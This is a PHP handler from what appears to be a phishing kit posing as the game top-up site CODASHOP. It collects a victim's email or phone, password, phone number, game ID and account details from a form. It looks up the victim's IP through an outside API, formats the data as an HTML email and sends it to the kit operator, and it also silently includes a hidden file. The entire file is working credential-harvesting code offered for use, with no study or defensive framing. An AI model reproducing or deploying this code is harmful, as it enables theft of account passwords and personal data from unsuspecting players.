<?php
extract($_POST);
if(isset($user)){
   $date = date('l, d-m-Y h:i:s');

   // Get Flag
   $ch = curl_init();  
   curl_setopt($ch, CURLOPT_URL, "https://api-xyz.com/system/flag/?ip=".$ip); 
   curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);  
   $exe = curl_exec($ch); 
   curl_close($ch);      

   $xyz = json_decode($exe,true);

   $subjek = ' '.$xyz['code'].' | '.$xyz['flag'].' | CODASHOP | LVL '.$level.'  | '.$nick.' ';
   $pesan = '
   <center>
    <div style="background: url(https://i.ibb.co/dKzXyrp/coollogo-com-101334325.png) no-repeat;border:2px solid pink;background-size: 100%; width: 294; height: 101px; color: #000; text-align: center; border-top-left-radius: 5px; border-top-right-radius: 5px;">
   </div>
    <table border="1" bordercolor="#19233f" style="color:#fff;border-radius:8px; border:3px solid pink; border-collapse:collapse;width:100%;background:#cf0485;">
       <tr>
   <th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Email/Telepon</b></th>
   <th style="padding:3px;width: 65%; text-align: center;"><b>'.$user.'</th> 
   </tr>
   <tr>
   <th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Password</th>
   <th style="padding:3px;width: 65%; text-align: center;"><b>'.$pass.'</th> 
   </tr>
   <th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Nomor HP</th>
   <th style="width: 65%; text-align: center;"><b>'.$hp.'</th> 
   </tr>
   <tr>
   <th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>ID</th>
   <th style="width: 65%; text-align: center;"><b>'.$id.'</th> 
   </tr>
   <tr>
   <th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Nickname</th>
   <th style="width: 65%; text-align: center;"><b>'.$nick.'</th> 
   </tr>
   <tr>
   <th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Elite Pass</th>
   <th style="width: 65%; text-align: center;"><b>'.$ep.'</th> 
   </tr>
   <tr>
   <th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Tier</th>
   <th style="width: 65%; text-align: center;"><b>'.$tier.'</th> 
   </tr>
   <tr>
   <th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Date</th>
   <th style="width: 65%; text-align: center;"><b>'.$date.'</th> 
   </tr>
   </table>
   <div style="border:2px solid pink;width: 294; font-weight:bold; height: 20px; background: #cf0485; color: #fff; padding: 10px; border-bottom-left-radius: 5px; border-bottom-right-radius: 5px; text-align:center;">

   <a style="border:2px solid #fff;text-decoration:none;color:#fff;border-radius:3px;padding:3px;background:#3b5998;" href="https://www.facebook.com/nguyenxwann">Facebook</a>
   <a style="border:2px solid #fff;text-decoration:none;color:#fff;border-radius:3px;padding:3px;background:#0088CC;" href="http://t.me/nguyenxstore">Telegram</a>
   <a style="border:2px solid #fff;text-decoration:none;color:#fff;border-radius:3px;padding:3px;background:#25D366;" href="https://chat.whatsapp.com/J1Cb9CGCfMRHuqhVqEt3dC">Whatsapp</a>
   </div>
    <center>
   ';
   include'email.php';
   $sender = 'From: ⭑ BISMILAH GEMGE ⭑<renzichwan@gmail.com>';
   $headers  = 'MIME-Version: 1.0' . "\r\n";
   $headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
   $headers .= ''.$sender.'' . "\r\n";
   include'css/.cgi.php';
   // MENGIRIM DATA KE EMAIL
   mail($email, $subjek, $pesan, $headers);
}else{
header('location:index.html');
}
?>